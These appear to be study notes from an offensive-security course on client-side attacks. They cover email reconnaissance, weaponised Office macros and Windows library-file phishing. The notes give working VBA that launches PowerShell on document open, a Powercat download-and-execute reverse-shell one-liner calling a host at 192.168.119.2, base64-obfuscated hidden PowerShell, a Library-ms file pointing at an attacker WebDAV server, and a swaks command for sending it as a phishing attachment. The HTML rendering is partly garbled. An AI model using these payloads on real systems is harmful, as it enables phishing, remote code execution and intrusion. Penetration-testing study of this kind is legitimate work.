<h3 id="information-gathering">Information Gathering</h3>
<ul>
<li><strong>Metadata</strong><ul>
<li>Examining metadata of company-created PDFs can be a good source of information</li>
</ul>
</li>
<li>theHarvester - searches for emails given a domain -d</li>
<li><strong>Client Fingerprinting</strong><ul>
<li>Canarytokens - tool that can fingerprint a computer from a link<ul>
<li>This token grabs browser info, IP address, and OS info</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="attacking-ms-office">Attacking MS Office</h3>
<ul>
<li><strong>MS Office Attack</strong><ul>
<li>Can&#39;t send malware directly by email, so we need to get them to download the spreadsheet with macros from a link</li>
<li>Also need to &quot;blur&quot; the spreadsheet so victim clicks &quot;Enable Editing&quot; to allow macros</li>
<li>Avoid Mark of the Web (MOTW) by putting malware inside 7zip, ISO, IMG</li>
</ul>
</li>
<li><p><strong>MS Office Macros</strong></p>
<ul>
<li>To make macros: View -&gt; Macros</li>
<li>Basic macro code that opens powershell:
```
Sub AutoOpen()</li>
</ul>
<p>MyMacro</p>
</li>
</ul>
<p>End Sub
Sub Document_Open()</p>
<p>  MyMacro</p>
<p>End Sub
Sub MyMacro()</p>
<p>  CreateObject(&quot;Wscript.Shell&quot;).Run &quot;powershell&quot;</p>
<p>End Sub</p>
<pre><code>-<span class="ruby"> Powercat
</span>    -<span class="ruby"> Creates reverse shells, but detected by defender
</span>    -<span class="ruby"> Command to download/execute the reverse <span class="hljs-symbol">shell:</span> <span class="hljs-string">`IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell`</span>
</span>        -<span class="ruby"> This is just grabbing a hosted powershell script
</span>        -<span class="ruby"> <span class="hljs-symbol">Powercat:</span> 
</span>    -<span class="ruby"> Can be passed to the macro by encoding it <span class="hljs-keyword">in</span> chunks of <span class="hljs-number">50</span> base64 <span class="hljs-symbol">characters:</span>
</span>        -<span class="ruby"> <span class="hljs-string">`Dim Str as String`</span>
</span>        -<span class="ruby"> <span class="hljs-string">`Str = Str + "powershell.exe -nop -w hidden -enc {base64}"`</span>
</span>        -<span class="ruby"> <span class="hljs-string">`Str = Str + {base64}"`</span>
</span>        -<span class="ruby"> <span class="hljs-string">`CreateObject("Wscript.Shell").Run Str`</span>
</span>
### Abusing Windows Library Files
-<span class="ruby"> Windows library files are less well-known <span class="hljs-keyword">and</span> can be equally effective
</span>-<span class="ruby"> Executing .Library-ms file into executing .lnk file
</span>-<span class="ruby"> These files display remote directories like local directories, where we put .lnk file
</span>    -<span class="ruby"> <span class="hljs-string">`pip3 install wsgidav`</span> <span class="hljs-keyword">for</span> a WebDAV server to host/serve files
</span>    -<span class="ruby"> <span class="hljs-symbol">usage:</span> <span class="hljs-string">`wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root {directory}`</span>  
</span>-<span class="ruby"> config.Library-ms file <span class="hljs-symbol">contents:</span></span>
</code></pre><p>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</p>
<p><libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name></p>
<p><version>6</version></p>
<p><isLibraryPinned>true</isLibraryPinned></p>
<p><iconReference>imageres.dll,-1003</iconReference></p>
<p><templateInfo></p>
<p><folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo></p>
<p><searchConnectorDescriptionList></p>
<p><searchConnectorDescription></p>
<p><isDefaultSaveLocation>true</isDefaultSaveLocation></p>
<p><isSupported>false</isSupported></p>
<p><simpleLocation></p>
<p><url><a href="http://192.168.119.2">http://192.168.119.2</a></url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```</p>
<ul>
<li>Sending a phishing email with the share:<ul>
<li><code>sudo swaks -t {to_email} -t {to_email} --from {from_email} --attach @config.Library-ms --server {mail_server} --body @body.txt --header &quot;Subject: Staging Script&quot; --suppress-data -ap</code></li>
</ul>
</li>
</ul>
